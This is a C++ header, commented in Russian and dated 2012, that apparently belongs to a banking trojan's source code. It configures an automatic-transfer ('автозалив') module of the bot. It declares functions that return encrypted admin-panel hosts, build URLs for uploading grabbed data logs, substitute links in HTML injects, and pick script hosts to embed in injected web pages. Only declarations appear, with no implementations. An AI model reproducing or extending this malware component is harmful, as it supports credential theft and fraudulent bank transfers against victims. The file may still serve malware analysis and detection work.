//---------------------------------------------------------------------------
//  Модуль хранения настроек системы зборки автозалива
//
//  версия 1.0
//  дата: март 2012
//
//
//  ВАЖНО!
//
//  Для использования отдельных ссылок системы AZ заголовочный файл
//  должен быть включён в модульный файл проекта Modules.h, в противном
//  случае будут использоваться основные настройки бота
//---------------------------------------------------------------------------



#ifndef AzConfigH
#define AzConfigH
//---------------------------------------------------------------------------

#include "GetApi.h"
#include "Strings.h"
#include "BotConfig.h"
#include "Config.h"



#define AZCONFIG_PARAM_SIZE_HOSTS       256
#define AZCONFIG_PARAM_SIZE_SCRIPTHOSTS 256
#define AZCONFIG_PARAM_SIZE_AZUSER      9


#define AZCONFIG_PARAM_NAME_HOSTS       "__AZ_HOSTS__\0"
#define AZCONFIG_PARAM_NAME_SCRIPTHOSTS "__AZ_SCRIPTS_HOSTS__\0"
#define AZCONFIG_PARAM_NAME_AZUSER      "_AZ_USER"

#define AZCONFIG_PARAM_ENCRYPTED_HOSTS        BOTPARAM_ENCRYPTED_MAINHOSTS
#define AZCONFIG_PARAM_ENCRYPTED_SCRIPTHOSTS  true
#define AZCONFIG_PARAM_ENCRYPTED_AZUSER       true





//----------------------------------------
//  GetAzUser
//  Функция возвращает имя пользователя
//  для систем автозалива
//----------------------------------------
string GetAzUser();


//----------------------------------------
//  GetAzHostsBuf
//   Фнкция возвращает казатель на бфер
//   хостов админки автозалива. AZ админка
//----------------------------------------
PCHAR GetAzHostsBuf();


//----------------------------------------
//  IsAzHost
//  функция возвращает истину если
//  указанный хост принадлежит массиву
//   хостов админки AZ
//----------------------------------------
bool IsAzHost(const char* Host);

//----------------------------------------
// GetAzHost
//  Функция возвращает первый рабочий хост
//  из массива хостов системы AZ
//  Wait - указание ожидать рабочего хоста
//----------------------------------------
string GetAzHost(bool Wait = false);

//----------------------------------------------------
//  GetAzURL
//   Функция возвращает полный адрес на
//   основе Хоста системы и переданного пути
//----------------------------------------------------
string GetAzURL(const char*  Path);


//----------------------------------------------------
//  GetAzGrabberURLPath
//   Функция возвращает путь URL для
//   отправки лога грабера
//----------------------------------------------------
string GetAzGrabberURLPath(const string& SystemName,  const char* Action = NULL);


//----------------------------------------------------
//  GetAzGrabberURL
//   Функция возвращает адрес в админке
//   AZ для отправки лога грабера
//----------------------------------------------------
string GetAzGrabberURL(const string& SystemName,  const char* Action = NULL);








//----------------------------------------------------
//  AzInizializeHTMLInjects  - Функция инициализирует
//  систему подмены ссылок в HTML инжектах
//----------------------------------------------------
void AzInizializeHTMLInjects();


//----------------------------------------------------
// AzCheckScriptHosts - Функция запускает проверку
// хостов вшиваемых в HTML инжекты
//----------------------------------------------------
void AzCheckScriptHosts();


//----------------------------------------------------
// AzGetScriptHost - Функция возвращает  рабочий хост
// для вшития в HTML инжекты
//----------------------------------------------------
string AzGetScriptHost();



//---------------------------------------------------------------------------
#endif
